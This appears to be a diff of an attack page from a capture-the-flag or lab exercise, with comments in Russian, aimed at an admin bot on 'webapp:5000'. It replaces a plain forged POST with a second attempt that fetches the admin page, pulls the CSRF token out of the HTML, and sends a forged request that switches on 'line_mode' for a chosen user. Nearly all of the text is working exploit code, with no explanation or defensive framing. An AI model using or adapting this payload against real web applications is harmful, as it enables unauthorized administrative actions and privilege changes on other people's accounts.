@@ -4,16 +4,21 @@
     <form action="http://webapp:5000/admin/line-mode/user/2b3549aa-5e6a-47ef-8f24-a82a5cfe29b3" method="POST">
         <input type="hidden" name="line_mode" value="1">
         </form>
-    
+
     <script>
-        // Более хитрый способ: пытаемся найти токен в DOM, если админ открыл страницу
-        // Но так как бот открывает ВНЕШНЮЮ ссылку, нам нужно использовать 
-        // уязвимость отсутствия проверки Origin или Referer.
-        fetch('/admin/line-mode/user/2b3549aa-5e6a-47ef-8f24-a82a5cfe29b3', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: 'line_mode=1' 
-        });
+        // Попытка №2: Загружаем страницу админа в фоне и вытаскиваем токен из HTML
+        fetch('http://webapp:5000/admin/pending')
+            .then(response => response.text())
+            .then(html => {
+                const doc = new DOMParser().parseFromString(html, 'text/html');
+                const token = doc.querySelector('input[name="csrf_token"]').value;
+                
+                fetch('http://webapp:5000/admin/line-mode/user/2b3549aa-5e6a-47ef-8f24-a82a5cfe29b3', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: 'line_mode=1&csrf_token=' + token
+                });
+            });
     </script>
 </body>
 </html>
